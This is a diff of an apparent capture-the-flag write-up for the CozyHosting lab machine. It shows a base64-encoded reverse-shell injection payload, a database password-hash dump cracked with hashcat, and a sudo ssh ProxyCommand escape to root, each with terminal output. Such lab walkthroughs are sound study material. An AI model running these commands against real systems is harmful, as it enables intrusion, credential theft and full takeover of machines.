@@ -13,11 +13,12 @@ layout:
     visible: true
 ---
 
-# Cozyhosting
+# CozyHosting
 
 
 
 ```bash
+
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.230 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-05 05:53 CET
@@ -300,6 +301,43 @@ gzzcoo;{echo,-n,YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0MyAwPiYxICAK}|{b
 
 
 
+```bash
+app@cozyhosting:/app$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+josh:x:1003:1003::/home/josh:/usr/bin/bash
+app@cozyhosting:/app$ id
+uid=1001(app) gid=1001(app) groups=1001(app)
+```
+
+
+
+```bash
+❯ nc -nlvp 443 > cloudhosting-0.0.1.jar
+listening on [any] 443 ...
+```
+
+
+
+{% embed url="https://stackoverflow.com/questions/38775194/where-is-the-application-properties-file-in-a-spring-boot-project" %}
+
+
+
+<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+
+
+
+```bash
+app@cozyhosting:/$ netstat -ano | grep LISTEN
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      off (0.00/0/0)
+app@cozyhosting:/$ which psql
+/usr/bin/psql
+```
 
 
 
@@ -307,4 +345,92 @@ gzzcoo;{echo,-n,YmFzaCAgLWkgID4mICAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0MyAwPiYxICAK}|{b
 
 
 
+```sql
+app@cozyhosting:/$ psql -h localhost -p 5432 -U postgres
+Password for user postgres: 
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
 
+postgres=# \list
+                                                                      List of databases
+    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
+-------------+----------+----------+-------------+-------------+-----------------------
+ cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+             |          |          |             |             | postgres=CTc/postgres
+ template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+             |          |          |             |             | postgres=CTc/postgres
+(4 rows)
+
+postgres=# \connect cozyhosting
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "cozyhosting" as user "postgres".
+
+cozyhosting=# \dt
+         List of relations
+ Schema | Name  | Type  |  Owner   
+--------+-------+-------+----------
+ public | hosts | table | postgres
+ public | users | table | postgres
+(2 rows)
+
+cozyhosting=# SELECT * FROM users;
+   name    |                           password                           | role  
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+(2 rows)
+```
+
+
+
+```bash
+❯ hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU
+
+...[snip]...
+
+$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
+```
+
+
+
+```bash
+app@cozyhosting:/$ su josh
+Password: 
+josh@cozyhosting:/$ cd /home/josh
+josh@cozyhosting:~$ cat user.txt 
+ef4f1dc1330fae598f4a90bbaa63e009
+```
+
+
+
+```bash
+josh@cozyhosting:~$ sudo -l
+[sudo] password for josh: 
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+```
+
+
+
+{% embed url="https://gtfobins.github.io/gtfobins/ssh/#sudo" %}
+
+```bash
+josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+# whoami
+root
+# cat /root/root.txt
+2dfc37e48378fb2e3831028263407f2c
+```
